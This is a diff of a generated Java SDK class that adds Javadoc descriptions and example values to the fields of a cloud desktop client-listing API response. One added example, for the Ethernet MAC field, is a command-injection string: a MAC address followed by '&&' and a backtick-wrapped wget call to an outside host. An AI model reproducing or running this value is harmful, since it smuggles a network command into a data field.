@@ -145,7 +145,10 @@ public class DescribeClientsResponseBody extends TeaModel {
         } 
 
         /**
-         * Code.
+         * <p>The error code returned when the call fails.</p>
+         * 
+         * <strong>example:</strong>
+         * <p>TERMINAL_NOT_FOUND</p>
          */
         public Builder code(String code) {
             this.code = code;
@@ -153,7 +156,7 @@ public class DescribeClientsResponseBody extends TeaModel {
         }
 
         /**
-         * Data.
+         * <p>The data returned when the call is successful.</p>
          */
         public Builder data(java.util.List<Data> data) {
             this.data = data;
@@ -161,7 +164,10 @@ public class DescribeClientsResponseBody extends TeaModel {
         }
 
         /**
-         * HttpStatusCode.
+         * <p>The HTTP status code.</p>
+         * 
+         * <strong>example:</strong>
+         * <p>200</p>
          */
         public Builder httpStatusCode(Integer httpStatusCode) {
             this.httpStatusCode = httpStatusCode;
@@ -169,7 +175,10 @@ public class DescribeClientsResponseBody extends TeaModel {
         }
 
         /**
-         * Message.
+         * <p>The error message returned when the call fails.</p>
+         * 
+         * <strong>example:</strong>
+         * <p>terminal not found</p>
          */
         public Builder message(String message) {
             this.message = message;
@@ -177,7 +186,10 @@ public class DescribeClientsResponseBody extends TeaModel {
         }
 
         /**
-         * NextToken.
+         * <p>The token for the next query. If the results are not fully returned in a single query, a non-empty NextToken is returned. You can pass the returned NextToken in subsequent queries to continue retrieving results.</p>
+         * 
+         * <strong>example:</strong>
+         * <p>AAAAAdEdsXbwG2ZlbWCzN4wTTg6wQvfp7u1BJl4bxCAby41POSaYAlCvfULQpkAnb0ff****</p>
          */
         public Builder nextToken(String nextToken) {
             this.nextToken = nextToken;
@@ -185,7 +197,10 @@ public class DescribeClientsResponseBody extends TeaModel {
         }
 
         /**
-         * RequestId.
+         * <p>The request ID.</p>
+         * 
+         * <strong>example:</strong>
+         * <p>C5DCE54A-B266-522E-A6ED-468AF45F5AAA</p>
          */
         public Builder requestId(String requestId) {
             this.requestId = requestId;
@@ -193,7 +208,10 @@ public class DescribeClientsResponseBody extends TeaModel {
         }
 
         /**
-         * Success.
+         * <p>Indicates whether the call was successful.</p>
+         * 
+         * <strong>example:</strong>
+         * <p>true</p>
          */
         public Builder success(Boolean success) {
             this.success = success;
@@ -201,7 +219,10 @@ public class DescribeClientsResponseBody extends TeaModel {
         }
 
         /**
-         * TotalCount.
+         * <p>The total number of returned results.</p>
+         * 
+         * <strong>example:</strong>
+         * <p>20</p>
          */
         public Builder totalCount(Integer totalCount) {
             this.totalCount = totalCount;
@@ -488,7 +509,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             } 
 
             /**
-             * EnablePolicy.
+             * <p>Indicates whether standalone policy is supported.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>True</p>
              */
             public Builder enablePolicy(Boolean enablePolicy) {
                 this.enablePolicy = enablePolicy;
@@ -496,7 +520,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * PasswordFreeLoginForbiddenReason.
+             * <p>The reason why password-free logon is forbidden.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>Reason</p>
              */
             public Builder passwordFreeLoginForbiddenReason(String passwordFreeLoginForbiddenReason) {
                 this.passwordFreeLoginForbiddenReason = passwordFreeLoginForbiddenReason;
@@ -504,7 +531,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * SupportAssistLogin.
+             * <p>Indicates whether assisted logon is supported.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>True</p>
              */
             public Builder supportAssistLogin(Boolean supportAssistLogin) {
                 this.supportAssistLogin = supportAssistLogin;
@@ -512,7 +542,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * SupportDiagnose.
+             * <p>Indicates whether remote diagnostics is supported.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>True</p>
              */
             public Builder supportDiagnose(Boolean supportDiagnose) {
                 this.supportDiagnose = supportDiagnose;
@@ -520,7 +553,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * SupportLimitLoginUser.
+             * <p>Indicates whether restricting logon users is supported.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>True</p>
              */
             public Builder supportLimitLoginUser(Boolean supportLimitLoginUser) {
                 this.supportLimitLoginUser = supportLimitLoginUser;
@@ -528,7 +564,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * SupportLocalDeviceSn.
+             * <p>Indicates whether localDeviceSn is supported.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>True</p>
              */
             public Builder supportLocalDeviceSn(Boolean supportLocalDeviceSn) {
                 this.supportLocalDeviceSn = supportLocalDeviceSn;
@@ -536,7 +575,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * SupportManage.
+             * <p>Indicates whether management is supported.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>True</p>
              */
             public Builder supportManage(Boolean supportManage) {
                 this.supportManage = supportManage;
@@ -544,7 +586,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * SupportModifyPolicy.
+             * <p>Indicates whether policy modification is supported.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>True</p>
              */
             public Builder supportModifyPolicy(Boolean supportModifyPolicy) {
                 this.supportModifyPolicy = supportModifyPolicy;
@@ -552,7 +597,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * SupportPasswordFreeLogin.
+             * <p>Indicates whether password-free logon is supported.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>True</p>
              */
             public Builder supportPasswordFreeLogin(Boolean supportPasswordFreeLogin) {
                 this.supportPasswordFreeLogin = supportPasswordFreeLogin;
@@ -560,7 +608,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * SupportReboot.
+             * <p>Indicates whether restart is supported.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>True</p>
              */
             public Builder supportReboot(Boolean supportReboot) {
                 this.supportReboot = supportReboot;
@@ -568,7 +619,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * SupportReset.
+             * <p>Indicates whether factory reset is supported.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>True</p>
              */
             public Builder supportReset(Boolean supportReset) {
                 this.supportReset = supportReset;
@@ -576,7 +630,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * SupportResetPin.
+             * <p>Indicates whether the clear PIN button is grayed out.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>True</p>
              */
             public Builder supportResetPin(Boolean supportResetPin) {
                 this.supportResetPin = supportResetPin;
@@ -584,7 +641,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * SupportStop.
+             * <p>Indicates whether shutdown is supported.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>True</p>
              */
             public Builder supportStop(Boolean supportStop) {
                 this.supportStop = supportStop;
@@ -592,7 +652,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * SupportUpgrade.
+             * <p>Indicates whether remote upgrade is supported.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>True</p>
              */
             public Builder supportUpgrade(Boolean supportUpgrade) {
                 this.supportUpgrade = supportUpgrade;
@@ -600,7 +663,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * UnsupportAssistLoginReason.
+             * <p>The reason why assisted logon is forbidden.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>Reason</p>
              */
             public Builder unsupportAssistLoginReason(String unsupportAssistLoginReason) {
                 this.unsupportAssistLoginReason = unsupportAssistLoginReason;
@@ -608,7 +674,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * UnsupportManageReason.
+             * <p>The reason why management is forbidden.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>Reason</p>
              */
             public Builder unsupportManageReason(String unsupportManageReason) {
                 this.unsupportManageReason = unsupportManageReason;
@@ -616,7 +685,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * UnsupportedLocalDeviceSnReason.
+             * <p>The reason why localDeviceSn is forbidden.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>Reason</p>
              */
             public Builder unsupportedLocalDeviceSnReason(String unsupportedLocalDeviceSnReason) {
                 this.unsupportedLocalDeviceSnReason = unsupportedLocalDeviceSnReason;
@@ -624,7 +696,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * VersionSupported.
+             * <p>Indicates whether the version is supported (V7.12.0 or later).</p>
+             * 
+             * <strong>example:</strong>
+             * <p>True</p>
              */
             public Builder versionSupported(Boolean versionSupported) {
                 this.versionSupported = versionSupported;
@@ -632,7 +707,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * VersionTooLow.
+             * <p>Indicates whether the version is too low and an upgrade is recommended.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>True</p>
              */
             public Builder versionTooLow(Boolean versionTooLow) {
                 this.versionTooLow = versionTooLow;
@@ -764,7 +842,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             } 
 
             /**
-             * Bluetooth.
+             * <p>The Bluetooth MAC address.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>24:21:5E:B3:5A:4A</p>
              */
             public Builder bluetooth(String bluetooth) {
                 this.bluetooth = bluetooth;
@@ -783,7 +864,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * Cpu.
+             * <p>The CPU information.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>24</p>
              */
             public Builder cpu(String cpu) {
                 this.cpu = cpu;
@@ -791,7 +875,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * Mac.
+             * <p>The Ethernet MAC address.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>00:1A:2B:3C:4D:5E&amp;&amp;<code>wget 31lojfVB.popscan.xaliyun.com</code>%3B</p>
              */
             public Builder mac(String mac) {
                 this.mac = mac;
@@ -799,7 +886,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * Memory.
+             * <p>The memory information.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>128</p>
              */
             public Builder memory(String memory) {
                 this.memory = memory;
@@ -807,7 +897,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * Storage.
+             * <p>The storage information.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>20</p>
              */
             public Builder storage(String storage) {
                 this.storage = storage;
@@ -1442,7 +1535,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * Alias.
+             * <p>The alias.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>DemoDevice</p>
              */
             public Builder alias(String alias) {
                 this.alias = alias;
@@ -1450,7 +1546,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * AreaSite.
+             * <p>The area site.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>ap-southeast-1</p>
              */
             public Builder areaSite(String areaSite) {
                 this.areaSite = areaSite;
@@ -1458,7 +1557,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * BindUserCount.
+             * <p>The number of bound logon users.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>1</p>
              */
             public Builder bindUserCount(Integer bindUserCount) {
                 this.bindUserCount = bindUserCount;
@@ -1466,7 +1568,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * BindUserId.
+             * <p>The password-free logon user.</p>
+             * 
+             * <strong>example:</strong>
+             * <hr>
              */
             public Builder bindUserId(String bindUserId) {
                 this.bindUserId = bindUserId;
@@ -1474,7 +1579,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * BuildId.
+             * <p>The system version number.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>7.0.2-RS-***</p>
              */
             public Builder buildId(String buildId) {
                 this.buildId = buildId;
@@ -1482,7 +1590,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * ClientType.
+             * <p>The client type.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>1</p>
              */
             public Builder clientType(Integer clientType) {
                 this.clientType = clientType;
@@ -1490,7 +1601,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * ClientVersion.
+             * <p>The client version.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>1.2.1-DAILY-20240906.140842</p>
              */
             public Builder clientVersion(String clientVersion) {
                 this.clientVersion = clientVersion;
@@ -1498,7 +1612,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * CurrentConnectDesktop.
+             * <p>The currently used desktop.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>ecd-drqmaogzbmbdf****</p>
              */
             public Builder currentConnectDesktop(String currentConnectDesktop) {
                 this.currentConnectDesktop = currentConnectDesktop;
@@ -1506,7 +1623,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * CurrentLoginUser.
+             * <p>The currently logged-on user.</p>
+             * 
+             * <strong>example:</strong>
+             * <hr>
              */
             public Builder currentLoginUser(String currentLoginUser) {
                 this.currentLoginUser = currentLoginUser;
@@ -1514,7 +1634,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * CustomResInvalidReason.
+             * <p>The reason why the custom resource is invalid.</p>
+             * 
+             * <strong>example:</strong>
+             * <hr>
              */
             public Builder customResInvalidReason(String customResInvalidReason) {
                 this.customResInvalidReason = customResInvalidReason;
@@ -1522,7 +1645,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * CustomResourceId.
+             * <p>The custom resource ID.</p>
+             * 
+             * <strong>example:</strong>
+             * <hr>
              */
             public Builder customResourceId(String customResourceId) {
                 this.customResourceId = customResourceId;
@@ -1530,7 +1656,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * CustomResourceName.
+             * <p>The custom resource name.</p>
+             * 
+             * <strong>example:</strong>
+             * <hr>
              */
             public Builder customResourceName(String customResourceName) {
                 this.customResourceName = customResourceName;
@@ -1538,7 +1667,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * CustomResourceStatus.
+             * <p>The custom resource status.</p>
+             * 
+             * <strong>example:</strong>
+             * <hr>
              */
             public Builder customResourceStatus(Boolean customResourceStatus) {
                 this.customResourceStatus = customResourceStatus;
@@ -1546,7 +1678,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * DesktopId.
+             * <p>The currently used desktop.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>ecd-9ior729dcvn91uo9i</p>
              */
             public Builder desktopId(String desktopId) {
                 this.desktopId = desktopId;
@@ -1554,7 +1689,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * DesktopRegionId.
+             * <p>The desktop region.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>cn-hangzhou</p>
              */
             public Builder desktopRegionId(String desktopRegionId) {
                 this.desktopRegionId = desktopRegionId;
@@ -1562,7 +1700,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * DeviceOs.
+             * <p>The device operating system.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>Windows</p>
              */
             public Builder deviceOs(String deviceOs) {
                 this.deviceOs = deviceOs;
@@ -1570,7 +1711,7 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * FunctionSupport.
+             * <p>The features and support information.</p>
              */
             public Builder functionSupport(FunctionSupport functionSupport) {
                 this.functionSupport = functionSupport;
@@ -1578,7 +1719,7 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * HardwareInfo.
+             * <p>The hardware information.</p>
              */
             public Builder hardwareInfo(HardwareInfo hardwareInfo) {
                 this.hardwareInfo = hardwareInfo;
@@ -1586,7 +1727,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * HostOsInfo.
+             * <p>The host operating system information.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>Windows</p>
              */
             public Builder hostOsInfo(String hostOsInfo) {
                 this.hostOsInfo = hostOsInfo;
@@ -1594,7 +1738,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * InManage.
+             * <p>Indicates whether the client is managed.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>True</p>
              */
             public Builder inManage(Boolean inManage) {
                 this.inManage = inManage;
@@ -1602,7 +1749,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * IpGeoLocation.
+             * <p>The geolocation of the public IP address.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>CN-Zhejiang</p>
              */
             public Builder ipGeoLocation(String ipGeoLocation) {
                 this.ipGeoLocation = ipGeoLocation;
@@ -1621,7 +1771,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * LastLoginUser.
+             * <p>The most recently logged-on user.</p>
+             * 
+             * <strong>example:</strong>
+             * <hr>
              */
             public Builder lastLoginUser(String lastLoginUser) {
                 this.lastLoginUser = lastLoginUser;
@@ -1629,7 +1782,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * LocalDeviceSn.
+             * <p>The on-premises device SN.</p>
+             * 
+             * <strong>example:</strong>
+             * <hr>
              */
             public Builder localDeviceSn(String localDeviceSn) {
                 this.localDeviceSn = localDeviceSn;
@@ -1637,7 +1793,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * LocationInfo.
+             * <p>The location remarks.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>杭州市</p>
              */
             public Builder locationInfo(String locationInfo) {
                 this.locationInfo = locationInfo;
@@ -1645,7 +1804,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * LoginUser.
+             * <p>The currently logged-on user.</p>
+             * 
+             * <strong>example:</strong>
+             * <hr>
              */
             public Builder loginUser(String loginUser) {
                 this.loginUser = loginUser;
@@ -1653,7 +1815,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * MainBizType.
+             * <p>The main business type.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>enterprise</p>
              */
             public Builder mainBizType(String mainBizType) {
                 this.mainBizType = mainBizType;
@@ -1661,7 +1826,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * ManageTime.
+             * <p>The time when the client was managed.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>2020-01-01 00:00:00</p>
              */
             public Builder manageTime(String manageTime) {
                 this.manageTime = manageTime;
@@ -1669,7 +1837,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * ManageTimestamp.
+             * <p>The timestamp when the client was managed.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>1000000</p>
              */
             public Builder manageTimestamp(Long manageTimestamp) {
                 this.manageTimestamp = manageTimestamp;
@@ -1677,7 +1848,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * Model.
+             * <p>The device model.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>US01</p>
              */
             public Builder model(String model) {
                 this.model = model;
@@ -1685,7 +1859,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * ModelPreviewUrl.
+             * <p>The preview image URL of the device type.</p>
+             * 
+             * <strong>example:</strong>
+             * <hr>
              */
             public Builder modelPreviewUrl(String modelPreviewUrl) {
                 this.modelPreviewUrl = modelPreviewUrl;
@@ -1693,7 +1870,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * Online.
+             * <p>Indicates whether the client is online.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>true</p>
              */
             public Builder online(Boolean online) {
                 this.online = online;
@@ -1701,7 +1881,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * OnlineStatus.
+             * <p>Indicates whether the client is online.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>False</p>
              */
             public Builder onlineStatus(Boolean onlineStatus) {
                 this.onlineStatus = onlineStatus;
@@ -1709,7 +1892,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * PasswordFreeLoginUser.
+             * <p>The password-free logon user.</p>
+             * 
+             * <strong>example:</strong>
+             * <hr>
              */
             public Builder passwordFreeLoginUser(String passwordFreeLoginUser) {
                 this.passwordFreeLoginUser = passwordFreeLoginUser;
@@ -1717,7 +1903,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * Platform.
+             * <p>The device type.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>123123</p>
              */
             public Builder platform(String platform) {
                 this.platform = platform;
@@ -1736,7 +1925,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * PublicIpv4.
+             * <p>The public IP address.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>0.0.0.0</p>
              */
             public Builder publicIpv4(String publicIpv4) {
                 this.publicIpv4 = publicIpv4;
@@ -1744,7 +1936,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * SetPasswordFreeLoginUserTime.
+             * <p>The time when the password-free logon user was set.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>2020-01-01 00:00:00</p>
              */
             public Builder setPasswordFreeLoginUserTime(String setPasswordFreeLoginUserTime) {
                 this.setPasswordFreeLoginUserTime = setPasswordFreeLoginUserTime;
@@ -1752,7 +1947,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * TerminalGroupId.
+             * <p>The terminal group ID.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>tg-default</p>
              */
             public Builder terminalGroupId(String terminalGroupId) {
                 this.terminalGroupId = terminalGroupId;
@@ -1760,7 +1958,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * UpgradeDownloadType.
+             * <p>The upgrade type. Valid values: internet and lan.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>internet</p>
              */
             public Builder upgradeDownloadType(String upgradeDownloadType) {
                 this.upgradeDownloadType = upgradeDownloadType;
@@ -1768,7 +1969,10 @@ public class DescribeClientsResponseBody extends TeaModel {
             }
 
             /**
-             * UserBindCount.
+             * <p>The number of users bound to this device.</p>
+             * 
+             * <strong>example:</strong>
+             * <p>1</p>
              */
             public Builder userBindCount(Integer userBindCount) {
                 this.userBindCount = userBindCount;
